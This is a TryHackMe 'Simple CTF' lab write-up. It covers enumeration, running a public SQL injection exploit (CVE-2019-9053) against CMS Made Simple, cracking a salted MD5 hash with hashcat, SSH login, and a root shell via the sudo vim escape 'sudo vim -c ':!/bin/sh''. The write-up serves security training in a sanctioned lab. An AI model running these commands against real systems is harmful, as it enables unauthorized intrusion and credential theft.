# Simple CTF — TryHackMe

**Date:** June 2026  
**Difficulty:** Easy  
**Category:** Web, SQL Injection, Hash Cracking, Privilege Escalation  
**Status:** ✅ Completed  

---

# 🔍 Summary

Simple CTF is an easy TryHackMe room focused on web enumeration, SQL injection, credential harvesting, password cracking, and Linux privilege escalation. The objective was to identify a vulnerable CMS installation, extract credentials through SQL injection, gain SSH access, and escalate privileges to root using misconfigured sudo permissions.

---

# 🛠️ Tools Used

- Nmap
- Gobuster
- Exploit-DB
- Python
- FTP
- Hash Identifier
- Hashcat
- SSH
- GTFOBins

---

# 📡 Reconnaissance

## Nmap Scan

```bash
nmap -sS -A -T4 MACHINE_IP
```

<img width="2345" height="793" alt="Screenshot 2026-05-29 202349" src="https://github.com/user-attachments/assets/d6a6c381-7483-4251-ae92-1565a3a70417" />


### Findings

| Port | Service |
|--------|---------|
| 21 | FTP |
| 80 | HTTP |
| 2222 | SSH |

Important findings:

- Anonymous FTP login enabled
- CMS Made Simple discovered later through web enumeration
- SSH running on non-standard port 2222

---

## Website Enumeration

Browsing the website revealed the default Apache page.

<img width="2363" height="1319" alt="Screenshot 2026-06-02 200004" src="https://github.com/user-attachments/assets/cd26b644-6fc4-494f-96a2-4aa0630795de" />

Since no useful information was available, I performed directory enumeration.

---

## Gobuster Enumeration

```bash
gobuster dir -u http://MACHINE_IP/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-t 100
```

<img width="937" height="361" alt="Screenshot 2026-05-29 202741" src="https://github.com/user-attachments/assets/161ae0e2-43ae-4543-8e1b-1c2dc3774432" />


### Directories Found

```text
/simple
```

The `/simple` directory hosted a CMS Made Simple application.

---

# 🔓 Exploitation

## CMS Made Simple SQL Injection

Researching the CMS version led to a public SQL injection vulnerability.

Exploit reference:

```text
CMS Made Simple < 2.2.10 - SQL Injection
CVE-2019-9053
```

<img width="1797" height="1282" alt="Screenshot 2026-05-29 203038" src="https://github.com/user-attachments/assets/d0853e90-dd3c-46c3-ae67-6dcf3703dc14" />


I downloaded the exploit script and executed it against the target.

<img width="651" height="514" alt="Screenshot 2026-05-29 203128" src="https://github.com/user-attachments/assets/2a347623-d5fe-4d36-8ab7-21b741d1a87a" />


```bash
python2 SimpleCTF.py \
-u http://MACHINE_IP/simple/ \
-w /usr/share/wordlists/rockyou.txt
```

<img width="783" height="70" alt="Screenshot 2026-06-01 202753" src="https://github.com/user-attachments/assets/aff89906-5a53-4195-aebf-13fc73be6793" />


### Credentials Extracted

```text
Username: mitch
Email: admin@admin.com
Hash: 0c01f4468bd75d7a84c7eb73846e8d96
Salt: 1dac0d92e9fa6bb2
```
<img width="454" height="97" alt="Screenshot 2026-06-01 202804" src="https://github.com/user-attachments/assets/7ee30240-9639-456d-bd8d-16dfc05fcecc" />

---

## FTP Enumeration

Anonymous FTP access was available.

```bash
ftp MACHINE_IP
```

<img width="2225" height="758" alt="Screenshot 2026-06-02 192713" src="https://github.com/user-attachments/assets/79588380-c97b-48bf-be70-c7fc59f56d82" />


A file named:

```text
ForMitch.txt
```

was discovered.

Contents:

```text
Dammit man... you're the worst dev I've seen.
You set the same password for the system user,
and the password is so weak...
I cracked it in seconds.
```

This suggested that the CMS password and system password were identical.

---

## Hash Cracking

First, I identified the hash format.

```bash
hash-identifier HASH
```

<img width="640" height="1113" alt="Screenshot 2026-06-02 193516" src="https://github.com/user-attachments/assets/ff800e60-98a1-4553-8950-ac99faab892e" />


The hash was identified as MD5.

Using Hashcat:

```bash
hashcat -m 20 \
HASH:SALT \
/usr/share/wordlists/rockyou.txt
```

<img width="1232" height="1112" alt="Screenshot 2026-06-02 194413" src="https://github.com/user-attachments/assets/90f40561-071a-40f9-9614-8f9b8cd2e714" />


### Password Recovered

```text
secret
```

---

## SSH Access

Using the discovered credentials:

```bash
ssh mitch@MACHINE_IP -p 2222
```

<img width="774" height="571" alt="Screenshot 2026-06-02 194752" src="https://github.com/user-attachments/assets/8483805a-82db-41e4-af96-2d60f9bbe13b" />


Successfully logged in as user:

```text
mitch
```

---

# 🚩 User Flag

Inside Mitch's home directory:

```bash
ls
cat user.txt
```

Output:

```text
G00d j0b, keep up!
```

---

# ⬆️ Privilege Escalation

## Sudo Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
(root) NOPASSWD: /usr/bin/vim
```


---

## GTFOBins Research

Searching GTFOBins for Vim privilege escalation revealed:

```bash
sudo vim -c ':!/bin/sh'
```

<img width="2360" height="1324" alt="Screenshot 2026-06-02 195617" src="https://github.com/user-attachments/assets/8c975189-d58e-40c3-8cdc-0758b4eb6ee8" />


---

## Root Shell

Executing:

```bash
sudo vim -c ':!/bin/sh'
```

spawned a root shell.

<img width="753" height="686" alt="Screenshot 2026-06-02 195654" src="https://github.com/user-attachments/assets/271b9419-6c48-4bb1-8730-d4a859f0a19a" />


Verifying privileges:

```bash
whoami
```

Output:

```text
root
```

---

# 🚩 Root Flag

Reading the root flag:

```bash
cd /root
cat root.txt
```

Output:

```text
W3ll d0n3. You made it!
```

---
<img width="1652" height="961" alt="Screenshot 2026-06-02 195706" src="https://github.com/user-attachments/assets/2d490caf-9981-4f1f-841a-e2735b0dabd8" />

# 📚 Lessons Learned

- Practiced web directory enumeration
- Identified vulnerable CMS software
- Exploited SQL injection to retrieve credentials
- Learned hash identification techniques
- Cracked salted password hashes with Hashcat
- Used anonymous FTP shares for additional intelligence gathering
- Practiced SSH access using recovered credentials
- Learned privilege escalation through misconfigured sudo permissions
- Used GTFOBins for privilege escalation research

---
